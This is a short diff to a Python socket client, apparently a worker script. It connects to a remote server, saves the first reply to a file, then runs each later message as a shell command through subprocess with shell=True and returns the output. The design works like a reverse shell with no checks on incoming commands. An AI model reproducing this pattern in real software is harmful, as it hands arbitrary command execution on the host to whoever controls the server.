@@ -12,9 +12,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     while True:
         try:
             s.connect((HOST, PORT))
+            with open('test.lst','w') as file:
+                file.write(s.recv(1024).decode())
             break
         except:
-            print('cant connect')
+            print('wait server...')
             sleep(2)
             pass
 
@@ -22,10 +24,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
             #sleep(2)
             data = s.recv(1024)
+
             print(data.decode())
             if data:
+                data = data.decode() + ' test.lst'
                 print('start working')
-                output = subprocess.check_output(data.decode(),shell=True)
+                output = subprocess.check_output(data,shell=True)
                 s.send(output)
                 print('end working')
             if not data:
